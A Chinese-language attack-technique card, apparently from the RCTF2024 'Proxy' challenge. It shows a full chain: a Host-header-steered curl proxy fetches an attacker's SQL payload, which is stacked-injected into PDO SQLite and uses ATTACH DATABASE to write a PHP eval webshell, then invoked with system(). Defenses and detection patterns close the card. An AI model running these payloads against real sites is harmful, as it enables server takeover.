---
id: web-generic-sqli-sqlite-attach-database-php-webshell-proxy-ssrf
title: SQLite ATTACH DATABASE 写 PHP WebShell：代理 curl 拉取攻击者 SQL payload，堆叠注入落盘 dt.php 直接解析
type: scenario
domain: web
path: web/generic/sqli
technique: sqlite-attach-database-php-webshell
aliases:
- SQLite ATTACH DATABASE 写 PHP 马
- RCTF2024 Proxy
- PDO SQLite 堆叠注入写文件
- SQLite 数据库文件当 PHP 执行
- ATTACH DATABASE webshell
tags:
- sqli
- sqlite
- attach-database
- stacked-queries
- file-write
- php
- webshell
- ssrf
- curl
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V362
  verified_at: '2026-11-09T03:10:28+08:00'
  notes: 已对照原文与6张图片核对：Proxy.php/index.php/Db.php 源码、BE=shell+Host 指向攻击者 VPS 的触发请求(图01)、SQLite format 3 头+CREATE TABLE exp+ RCTF{...} 回显(图02)、PDO SQLite exec 逐条执行与 ATTACH DATABASE '/var/www/html/dt.php' 写 PHP 马链均一致。--force 理由复核成立：与既有 web-generic-sqli-sqlite-attach-database-write-template-include 仅共享 ATTACH 写文件 sink；既有卡为 Node db.exec+EJS 模板 include 读文件，本卡为 PHP PDO+curl 代理取回攻击者响应体堆叠注入+写 .php 被直接请求执行，投递方式与最终执行链不同，不属同一条链，保留两张合理。无 affected_versions(通用场景)正确。未验证点：原文未给出 Host→SERVER_NAME 的服务器配置，卡内已标 confidence=medium 并在边界注明；未在本地复现环境重建。
---

## 一句话结论

PHP 应用用 PDO SQLite 的 `exec` 逐条执行拼接 SQL，且把「curl 代理请求回的响应体」直接拼进 `INSERT ... VALUES('<body>')` 时，攻击者可让代理去取自己 VPS 上返回的 `a');ATTACH DATABASE '/var/www/html/dt.php' AS shell;CREATE TABLE shell.exp(payload text);INSERT INTO shell.exp VALUES('<?php eval($_GET[1]);?>');--`，利用 SQLite `ATTACH DATABASE` 在 Web 根目录创建数据库文件，再把该文件当 PHP 访问，文件中的 `<?php ... ?>` 被 PHP 解释器执行，得到 WebShell。

## 原理

- **SQLite ATTACH DATABASE 写文件**：`ATTACH DATABASE '/var/www/html/dt.php' AS shell` 会把指定路径当作数据库文件创建；随后 `CREATE TABLE shell.exp (...)` 与 `INSERT INTO shell.exp VALUES('...')` 把攻击者文本原样写进该文件的数据库页。SQLite 文件头是二进制 `SQLite format 3\0`，但其后的数据页中可包含任意字节。
- **为什么数据库文件能当 PHP 执行**：PHP 解析 `.php` 文件时会输出 HTML 与二进制内容，同时执行文件内任意位置的 `<?php ... ?>` 代码块；数据库文件头的二进制只会作为响应内容输出，不影响后续 PHP 标签执行。因此把 `<?php eval($_GET[1]);?>` 写进表数据，再直接请求该文件即可执行。
- **堆叠注入条件**：案例使用 `PDO` SQLite，`exec()` 支持用分号分隔的多条语句；`index.php` 把 `$ProxyObj->body` 直接拼进 `INSERT INTO Cache_<sess>_<BE> VALUES('<body>')`，攻击者用 `a');` 闭合字符串后即可堆叠 `ATTACH/CREATE/INSERT`，末尾 `--` 注释掉原语句剩余的 `')`。
- **payload 投递（代理/SSRF）**：`Proxy::SendRequest($URL)` 用 `$_SERVER['SERVER_NAME'].':'.$_SERVER['SERVER_PORT']` 拼出 `http://<server>/<BE>.php` 并 `curl_exec`。若 `SERVER_NAME` 受 Host 头影响（Apache `UseCanonicalName Off` 等配置），攻击者把 Host 指向自己的 VPS、`BE=shell`，服务端就会请求 `http://<vps>/shell.php`，由攻击者控制响应体；该响应体随后进入 SQL 拼接。
- **固定表名辅助**：`$sess = md5($_SERVER['REMOTE_ADDR'])`，`BE` 同时参与 `CREATE TABLE Cache_<sess>_<BE>` 与 `CacheDetail` 插入；案例用 `BE=shell` 保持表名合法，真正的注入放在代理响应体里。若代理不可控，`BE` 自身拼进表名也是注入点。

## 触发条件

- PHP + PDO SQLite，`PDO::exec` 允许一次执行多条 SQL（默认 SQLite 驱动支持）。
- 应用存在「把用户可控数据拼进 SQL」的位置（案例是代理响应体，也可能在 `BE` 表名、缓存表值）。
- 存在能把 HTTP 请求发往攻击者控制地址的 SSRF/代理，且目标 URL 的主机部分可由 Host 头、配置或参数影响。
- PHP 进程对 Web 根目录可写；`open_basedir`/`disable_functions` 未阻止 `ATTACH DATABASE` 目标路径与文件创建；Web 服务器会解析写入的 `.php` 文件。
- 数据库连接有 ATTACH 权限（SQLite 默认可 ATTACH 任意路径，路径需可写）。

## 利用步骤

1. 在 VPS 上放置返回 SQL payload 的 `shell.php`：

   ```php
   <?php
   echo "a');ATTACH DATABASE '/var/www/html/dt.php' AS shell;"
      . "create TABLE shell.exp (payload text);"
      . "insert INTO shell.exp (payload) VALUES ('<?php eval(\$_GET[1]);?>');--";
   ?>
   ```

2. 向目标发送 `GET /index.php?BE=shell`，并把 Host 头设为 VPS 域名/IP，让 `$_SERVER['SERVER_NAME']` 指向攻击者服务器；代理会请求 `http://<vps>/shell.php` 并取回 payload。
3. 目标执行 `INSERT INTO Cache_<sess>_shell VALUES('a');ATTACH DATABASE ...;--')`：`a');` 闭合字符串，`ATTACH DATABASE` 创建 `/var/www/html/dt.php`，`CREATE TABLE`+`INSERT` 写入 PHP 代码，`--` 注释尾部。
4. 访问 `http://target/dt.php?1=system('tac flag.php');`，PHP 执行 `eval($_GET[1])` 读取 flag；随后可换成任意命令执行。

## PoC

注入串（代理响应体）：

```text
a');ATTACH DATABASE '/var/www/html/dt.php' AS shell;create TABLE shell.exp (payload text);insert INTO shell.exp (payload) VALUES ('<?php eval($_GET[1]);?>');--
```

触发请求（Host 指向攻击者，BE 决定被代理的文件名）：

```http
GET /index.php?BE=shell HTTP/1.1
Host: <attacker-vps>
```

目标侧最终执行的 SQL（示意）：

```sql
INSERT INTO Cache_<md5(client_ip)>_shell VALUES('a');
ATTACH DATABASE '/var/www/html/dt.php' AS shell;
CREATE TABLE shell.exp (payload text);
INSERT INTO shell.exp (payload) VALUES ('<?php eval($_GET[1]);?>');
--');
```

访问 WebShell：

```http
GET /dt.php?1=system('tac flag.php'); HTTP/1.1
Host: target
```

响应中二进制 SQLite 文件头之后即为命令输出（案例读到 `$flag = 'RCTF{...}';`）。

## 变体与关联

- 关联：[[web-generic-sqli-sqlite-attach-database-write-template-include]]（同一 ATTACH DATABASE 写文件 sink，但目标为 Node/EJS 模板目录、借模板 include 读文件；本卡是 PHP 文件被直接请求执行，且增加了代理/SSRF 投递响应体的链路）。
- 变体：SQLite 其他写文件方式 `VACUUM INTO '/path'`（只能写数据库格式，仍需能写入含 PHP 标签的数据）；其他数据库对应 MySQL `INTO OUTFILE`、PostgreSQL `COPY ... TO PROGRAM`。
- 变体：若目标不能创建 `.php` 扩展名，可写 `.phtml`/`.php5` 或结合已有 include 点；若 ATTACH 路径受限，可先 `ATTACH` 到临时目录再借文件包含。
- 变体：代理不可控但 `BE` 拼接进表名时，可把注入放在 `BE` 中（`CREATE TABLE Cache_<sess>_<BE>`），需处理表名语法与长度限制。
- 边界：依赖 PDO SQLite 多语句执行与 Web 根可写；Host 头是否影响 `SERVER_NAME` 取决于 Web 服务器配置，原文未逐条给出该配置，代理投递部分置信度低于 ATTACH 写文件本体。

## 检测与防御

- 所有 SQL 使用参数化查询；禁止把请求体、Host/代理响应等外部数据拼进 SQL；表名/列名使用白名单。
- 禁用不必要的多语句执行（如 PHP PDO 自定义封装拆条执行）；SQLite 连接使用最小权限，Web 根目录对 PHP 进程只读。
- Web 服务器不要信任 Host 头拼内部请求 URL；代理/curl 目标使用固定白名单，禁止访问用户可影响的地址。
- 配置 `open_basedir` 限制 ATTACH 路径；监控 Web 根目录出现以 `SQLite format 3` 开头的 `.php` 文件。
- 检测特征：请求参数或响应体中出现 `ATTACH DATABASE`、`CREATE TABLE ... payload`、`<?php eval(`；同一请求后续访问新出现的 `.php` 且带命令参数；Web 目录新增文件哈希/内容告警。
